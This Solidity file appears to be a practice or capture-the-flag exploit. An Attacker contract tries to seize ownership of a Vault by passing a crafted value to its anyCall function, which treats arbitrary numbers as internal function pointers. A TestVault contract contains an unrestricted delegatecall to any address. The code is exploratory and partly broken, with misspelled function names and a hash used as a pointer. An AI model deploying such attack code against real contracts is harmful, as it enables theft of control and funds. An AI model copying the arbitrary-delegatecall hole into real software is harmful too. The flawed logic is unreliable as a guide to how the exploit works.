pragma solidity ^0.8.13;

import './Vault.sol';

// contract Vault {
//     address public owner;
//     bytes32 public immutable name;
//     constructor (bytes32 _name) {
//         owner = msg.sender;
//         name = _name;
//     }

//     function anyCall(uint _func, uint data) external {
//         function(uint) func;
//         assembly {
//             func := _func
//         }
//         func(data);
//     }

//     function transferOwnership() public {
//         require(msg.sender == owner);
//         owner = msg.sender;
//     }
// }

// contract Unknown {
//     address public owner;

//     function changeOnwer() public {
//         owner = msg.sender;
//     }
// }

contract Attacker {
    address public owner;
    Vault public vault;

    constructor(address _vault) {
        owner = msg.sender;
        vault = Vault(_vault);
    }

    function attack() public {
        uint CHANGE_OWNER_SELECTOR = uint(keccak256(abi.encodeWithSignature("changeOwner(uint)")));
        // uint selector = uint(uint256(uint160(CHANGE_OWNER_SELECTOR)));
        // CHANGE_OWNER_SELECTOR, uint256(uint160(msg.sender))
        vault.anyCall(CHANGE_OWNER_SELECTOR, uint(uint160(msg.sender)));
        // (bool success, ) = address(vault).delegatecall(abi.encodeWithSignature("anyCall(bytes, address)",
        //     abi.encodeWithSignature("changeOnwer(address)", msg.sender), address(this)));
       
    }

    function changeOnwer(uint _owner) public {
        owner = address(uint160(_owner));
    }
}

contract TestVault {
    address public owner;


    constructor() {
        owner = msg.sender;

    }
    function anyCall(bytes calldata selector, address data) external {
        (bool success, ) = data.delegatecall(selector);
    }

    function changeOwner(uint _owner) public {
        require(msg.sender == owner, 'not a owner');
        owner = address(uint160(_owner));
    }  
}


